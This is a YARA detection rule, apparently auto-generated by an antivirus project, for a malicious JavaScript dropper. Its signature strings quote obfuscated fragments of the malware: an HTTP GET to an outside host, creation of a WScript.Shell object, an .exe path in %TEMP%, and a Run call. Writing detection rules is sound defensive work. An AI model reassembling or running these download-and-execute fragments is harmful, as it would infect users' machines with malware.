rule sig_20160401_dc4ed10701a8cc5ec478ddea2e42dfb0 {
  meta:
    description = "datamaliciousorder - file 20160401_dc4ed10701a8cc5ec478ddea2e42dfb0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "742b13d6d8e5bd8da591e283f61b4323ae6647fef1fa113ce5c15c24c437a2e3"

  strings:
    $s1  = "PbiCt[ViwQv](\"G\" + \"ET\", \"http://sirplusalot.org/p3owlk\", false);" fullword ascii
    $s2  = "function RycMf(XmwGk, RccNcr){GbkChw = GbkChw * 1; return XmwGk - RccNcr;};" fullword ascii
    $s3  = "var WlWzu = function IuhZl() {return WScript[AwiEc](\"WScript\"+\".Shell\");}(), XzuFll = 11;" fullword ascii
    $s4  = "if (PbiCt[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function NroAe() {return WlWzu[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"upT03QjyGK.ex\" + \"e\";};" fullword ascii
    $s6  = "function KczFl(){return AvNt + \"\";};" fullword ascii
    $s7  = "function OahZer() {return ((ZdgPs == true) && (ZdgPs == VlPg)) ? 1 : GbkChw;};" fullword ascii
    $s8  = "var ZdgPs = false;" fullword ascii
    $s9  = "var TpJm = new this[\"Date\"]();" fullword ascii
    $s10 = "function ErdBez(HosXya) {var JsfAg = (1, 2, 3, 4, 5, HosXya); return JsfAg;};" fullword ascii
    $s11 = "VlPg = true; " fullword ascii
    $s12 = "}while (XkYzg);" fullword ascii
    $s13 = "var VlPg = false;" fullword ascii
    $s14 = "return RycMf(QovRk, OkcTp);" fullword ascii
    $s15 = "var BqsWd = false;" fullword ascii
    $s16 = "function EvmAy(){return AwiEc;};" fullword ascii
    $s17 = "function VnZy()" fullword ascii
    $s18 = "function WvoHgy(){return 23;};" fullword ascii
    $s19 = "function NivTzr(YzMhr){WlWzu[\"R\"+\"un\"](YzMhr, GbkChw, GbkChw);};" fullword ascii
    $s20 = "ZdgPs = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}